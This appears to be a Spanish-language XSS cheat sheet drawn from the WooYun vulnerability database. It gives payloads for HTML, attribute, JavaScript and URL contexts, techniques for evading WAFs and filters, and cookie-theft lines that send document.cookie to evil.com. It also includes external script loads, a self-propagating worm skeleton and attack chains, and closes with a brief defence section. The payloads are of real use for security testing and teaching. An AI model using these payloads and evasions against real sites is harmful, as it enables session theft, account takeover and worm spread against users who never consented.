# Seguridad Web - XSS (Cross-Site Scripting)

> Fuente: Base de datos de vulnerabilidades WooYun (7,532 casos de XSS) | Extraído de web-injection.md

## II. XSS (Cross-Site Scripting)

### 2.1 Naturaleza de la vulnerabilidad

```
Entrada del usuario (datos) -> Salida sin codificar -> El navegador la interpreta como código -> Ejecución del script
```

**Fórmula central**: XSS = Ruptura del límite de confianza + Confusión del contexto de salida (el significado de los datos cambia dentro de HTML/JS/CSS/URL)

### 2.2 Métodos de detección

#### Puntos de salida de alto riesgo

| Punto de salida | Condición de activación | Escenario típico |
|-------|---------|---------|
| Apodo/firma de usuario | Carga de página | Página personal, comentarios, lista de amigos |
| Reflejo en cuadro de búsqueda | Operación de búsqueda | Página de resultados de búsqueda |
| Comentarios/mensajes | Visualización de contenido | Foro, blog, reseñas de productos |
| Nombre/descripción de archivo | Lista de archivos | Almacenamiento en la nube, álbum de fotos |
| Cuerpo/asunto del correo | Apertura del correo | Sistema de correo electrónico |
| Notas de pedido | Visualización en backend | Backend de e-commerce, sistema de tickets |

**Puntos de salida ocultos** (fáciles de pasar por alto): cabeceras HTTP (XFF/UA escritos en logs), envío por WAP mostrado en PC, apodo de cliente renderizado en Web, bandeja de borradores/lista de revisión

#### Determinación rápida del contexto

```
¿La salida está dentro de <script>? -> Contexto JS (verificar tipo de comillas)
¿La salida está en un valor de atributo? -> Contexto de atributo (verificar tipo de atributo)
¿La salida está en el contenido de una etiqueta? -> Contexto HTML (verificar etiquetas especiales textarea/title)
¿La salida está en una URL? -> Contexto URL (verificar restricciones de protocolo)
¿La salida está en CSS? -> Contexto CSS (verificar soporte de expression)
```

### 2.3 Payloads por contexto

#### Contenido de etiquetas HTML

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### Valores de atributos HTML

```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### Cadenas de JavaScript

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### Contexto URL

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 2.4 Técnicas de evasión de WAF/filtros

#### Evasión mediante codificación

```html
<!-- Entidades HTML -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
<!-- Base64 + protocolo data -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<!-- Codificación CSS (IE) -->
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

#### Deformación de etiquetas/atributos

```html
<ScRiPt>alert(1)</sCrIpT>              <!-- Confusión de mayúsculas/minúsculas -->
<script/src=//xss.com/x.js>            <!-- Barra en lugar de espacio -->
<img src=x onerror=alert(1)>           <!-- Sin comillas -->
<scrscriptipt>alert(1)</scrscriptipt>  <!-- Evasión por doble escritura -->
<scr\x00ipt>alert(1)</script>          <!-- Evasión con carácter nulo -->
```

#### Manejadores de eventos alternativos

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

#### Evasión específica de WAF

```html
.<script src=http://localhost/1.js>.    <!-- Anquanbao: agregar puntos antes y después -->
<!--[if true]><img onerror=alert(1) src=--> <!-- Interferencia con comentarios -->
```

#### Evasión de límites de longitud

```html
<script src=//xss.pw/j>                <!-- Carga externa más corta posible -->
<!-- Concatenación DOM -->
<script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
<!-- Concatenación de cadenas para evadir palabras clave -->
<script>window['al'+'ert'](1)</script>
<!-- fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### Evasión de HTTPOnly

- Uso de una interfaz Flash para obtener información del usuario en lugar de la Cookie
- Conversión a CSRF: ejecutar directamente operaciones sensibles (cambiar contraseña, agregar administrador, leer token)

### 2.5 Cadena de explotación

#### Robo de Cookie

```html
<script>new Image().src="https://evil.com/c?="+document.cookie</script>
<img src=x onerror="new Image().src='https://evil.com/c?='+document.cookie">
<script>fetch('https://evil.com/c?='+document.cookie)</script>
```

#### Fuentes y sumideros clave de XSS en DOM

**Fuentes peligrosas**: `location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`

**Sumideros peligrosos**: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`

#### Lógica central del gusano XSS

```javascript
// 1. Obtener la identidad del usuario actual (cookie/token)
// 2. Construir contenido que incluya el propio payload
// 3. Publicar/compartir automáticamente (AJAX POST)
// 4. Condición de activación: se propaga con solo verlo/visitarlo
function worm(){
    jQuery.post("/api/post", {"content": "<payload autopropagable>"})
}
worm()
```

#### Patrones de explotación combinada

```
XSS + CSRF -> Obtener Token para ejecutar operaciones administrativas
XSS + SQLi -> Ataque a ciegas para obtener Cookie -> Inyección en el backend
XSS -> Secuestro de cuenta -> Escalamiento de privilegios -> Propagación tipo gusano
XSS a ciegas (mensajes/tickets/comentarios) -> Obtener la Cookie del administrador del backend
```

### 2.6 Medidas de defensa

- **Codificación de salida** (núcleo): entidades HTML en contexto HTML, codificación JS en contexto JS, codificación URL en contexto URL
- Política CSP para restringir el origen de los scripts
- HTTPOnly para proteger la Cookie
- Validación de entrada por lista blanca (evitar listas negras, siempre quedan huecos)
- **Errores comunes**: filtrar solo la etiqueta script, filtrar solo minúsculas, filtrado en frontend evadible capturando el tráfico, filtrado de una sola pasada evadido por doble escritura

---

